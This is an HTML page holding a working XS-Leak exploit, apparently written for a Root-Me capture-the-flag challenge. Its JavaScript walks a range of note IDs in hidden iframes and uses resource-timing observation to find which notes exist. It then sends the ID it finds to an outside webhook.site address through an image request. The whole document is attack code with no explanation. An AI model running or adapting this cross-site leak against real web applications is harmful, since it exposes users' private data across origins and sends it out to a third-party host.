<!DOCTYPE html>
<html>
<head>
    <title>XS-Leak: Resource Detection</title>
</head>
<body>
    <h1>Scanning notes...</h1>
    <div id="status"></div>
    <script>
        const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
        const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
        const START_ID = 2805;
        const END_ID = 3000;        // adjust if needed
        const DELAY_MS = 500;
        const IFRAME_TIMEOUT = 3000;

        const CSS_URL = 'https://web-client-ch56.challenge01.root-me.org:58056/static/css/style.css';
        const JS_URL  = 'https://web-client-ch56.challenge01.root-me.org:58056/static/js/main.js';

        function updateStatus(msg) {
            const div = document.getElementById('status');
            div.innerHTML += msg + '<br>';
            console.log(msg);
        }

        async function checkResources(id) {
            return new Promise((resolve) => {
                const url = TARGET_BASE + id;
                const iframe = document.createElement('iframe');
                iframe.style.position = 'absolute';
                iframe.style.top = '-9999px';
                iframe.style.left = '-9999px';
                iframe.style.width = '1px';
                iframe.style.height = '1px';
                iframe.src = url;

                let resolved = false;
                let foundCSS = false;
                let foundJS = false;

                // Monitor resource entries
                const observer = new PerformanceObserver((list) => {
                    for (const entry of list.getEntries()) {
                        if (entry.name === CSS_URL) foundCSS = true;
                        if (entry.name === JS_URL) foundJS = true;
                    }
                    if (foundCSS || foundJS) {
                        if (!resolved) {
                            resolved = true;
                            observer.disconnect();
                            clearTimeout(timeout);
                            document.body.removeChild(iframe);
                            resolve(true);
                        }
                    }
                });
                observer.observe({ entryTypes: ['resource'] });

                const timeout = setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        observer.disconnect();
                        document.body.removeChild(iframe);
                        updateStatus(`ID ${id}: timeout (CSS=${foundCSS}, JS=${foundJS})`);
                        resolve(foundCSS || foundJS);
                    }
                }, IFRAME_TIMEOUT);

                // Start loading
                document.body.appendChild(iframe);
            });
        }

        async function run() {
            updateStatus(`Scanning IDs ${START_ID}–${END_ID}...`);
            for (let id = START_ID; id <= END_ID; id++) {
                performance.clearResourceTimings();
                const found = await checkResources(id);
                if (found) {
                    updateStatus(`✅ Valid note at ID ${id}`);
                    new Image().src = `${WEBHOOK}?id=${id}`;
                    break; // remove break to continue scanning
                } else {
                    updateStatus(`ID ${id}: no resources detected`);
                }
                await new Promise(r => setTimeout(r, DELAY_MS));
            }
            updateStatus('Scan complete.');
        }

        run();
    </script>
</body>
</html>
